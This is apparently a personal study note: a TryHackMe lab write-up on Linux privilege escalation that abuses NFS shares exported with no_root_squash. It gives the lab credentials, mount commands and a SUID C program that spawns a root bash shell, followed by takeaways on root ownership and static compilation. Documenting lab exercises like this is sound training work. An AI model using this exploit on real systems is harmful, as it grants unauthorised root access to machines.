**Main Topic:** Linux_Privilege_Escalation
**Sub Topic:** Linux_Privesc_Writeup_NFS
**Date:** 09-06-2026
**Resources:**
**Related Notes:**
Tags: #status/done
[Offensive_Security](/Offensive_Security/0_Offensive_Security_MOC.md) > [Linux_Privilege_Escalation](/Offensive_Security/Linux_Privilege_Escalation/0_Linux_Privilege_Escalation_MOC.md) > Linux_Privesc_Writeup_NFS

---

# TryHackMe — Linux_Privesc_Writeup_NFS

**Platform:** [TryHackMe](https://tryhackme.com)
**Room:** [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
**Task:** [TASK 11](https://tryhackme.com/room/linprivesc?taskNo=11&sharerId=6702abe0f77a70c90629f7db)
**Difficulty:**

> This is a guided TryHackMe room, not an independent CTF challenge.
> The target credentials were provided by the platform.
> The purpose of this writeup is to document the techniques practiced and
> reinforce learning, not to demonstrate blind exploitation.

> **Username: karen**
> **Password: Password1**
> **Target IP:** 10.112.175.35

---

## Connection

```bash
$ ssh karen@10.112.175.35
```

```bash
# Shell stabilisation (if needed)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 45 columns 188
```



---

## Question 1 — How many mountable shares can you identify on the target system?

### We should use `showmount`

```bash
# on attacking machine

$ showmount -e 10.112.175.35  
Export list for 10.112.175.35:  
/home/ubuntu/sharedfolder *  
/tmp                      *  
/home/backup              *
```

---

## Question 2 — How many shares have the "no_root_squash" option enabled?

```bash
# on target machine via ssh connection

$ cat /etc/exports    
# /etc/exports: the access control list for filesystems which may be exported  
#               to NFS clients.  See exports(5).  
#  
# Example for NFSv2 and NFSv3:  
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)  
#  
# Example for NFSv4:  
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)  
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)  
#  
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)  
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)  
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)

```

---

## Question 3 — Gain a root shell on the target system

### Mount the share on attacker machine as root

```bash
# on attacker machine as root

mkdir /tmp/nfs
mount -t nfs 10.112.175.35:/tmp /tmp/nfs
```
> We could have used any folder containing the “no_root_squash” option we found in the previous question. I chose the `/tmp` folder because it's typically used for operations like this.

### Create a malicious SUID binary on the mounted share

```bash
# on Kali as root
cd /tmp/nfs

nano nfs.c
	#include <unistd.h>
	#include <stdlib.h>

	int main() {
	    setuid(0);
	    setgid(0);
	    system("/bin/bash");
	    return 0;
	}
	
gcc nfs.c -o nfs -static
chmod +s nfs
```

### Execute on target
```bash
# on target machine
/tmp/nfs
whoami  # root
```

> We gained root privileges
---
## Question 4 — What is the content of the flag7.txt file?

```bash
# on target machine as root
find / -name flag*.txt  
/home/matt/flag7.txt  
cat /home/matt/flag7.txt  
<FLAG>
```

---
## Key Takeaways

**1. Root is required for mounting and creating the SUID binary**

The entire exploit relies on Kali-side operations being done as root. Two reasons:

- `mount` requires root to attach network filesystems
- The SUID binary must be **owned by root** with the `+s` bit set — only root can create a file owned by root. If you create it as a normal user, the binary will be owned by that user, not root, and the SUID bit won't grant root on the target

This is why `no_root_squash` is the critical misconfiguration — it allows your Kali root to act as root on the server's filesystem. With default root squashing, even if you mount as root, the server maps you to nobody.

---

**2. GLIBC version mismatch**

When you compile on Kali and run on the target, the binary is dynamically linked by default — it expects to find the same glibc version at runtime that was available during compilation. Kali typically has a newer glibc than the target machine, so the binary fails with:

```
version 'GLIBC_2.34' not found
```

Fix: compile with `-static` flag — this bundles all required libraries into the binary itself, making it independent of the target's glibc version:

```bash
gcc shell.c -o shell -static
```

Downside: static binaries are significantly larger. In most CTF/THM contexts this doesn't matter.

---

## Related Notes
- [Linux Privilege Escalation](/Offensive_Security/Linux_Privilege_Escalation/linux_privesc_notes.md)


---
[Offensive_Security](/Offensive_Security/0_Offensive_Security_MOC.md) > [Linux_Privilege_Escalation](/Offensive_Security/Linux_Privilege_Escalation/0_Linux_Privilege_Escalation_MOC.md) > Linux_Privesc_Writeup_NFS